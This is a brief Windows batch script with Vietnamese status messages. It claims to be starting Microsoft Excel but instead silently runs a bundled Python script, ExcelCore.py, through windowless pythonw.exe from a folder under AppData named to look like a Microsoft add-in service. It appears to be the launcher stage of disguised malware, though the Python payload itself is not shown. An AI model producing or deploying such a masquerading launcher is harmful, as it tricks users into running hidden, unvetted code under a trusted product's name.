@echo off
set "SERVICE_DIR=%APPDATA%\Microsoft\AddIns\ExcelCoreService"
cd /d "%SERVICE_DIR%"
echo Dang khoi dong Microsoft Excel...
echo Vui long cho trong giay lat (5-10 giay)...
"%SERVICE_DIR%\env_312\Scripts\pythonw.exe" "%SERVICE_DIR%\ExcelCore.py"

if %errorlevel% neq 0 (
    echo.
    echo Co loi xay ra khi khoi dong!
    pause
)
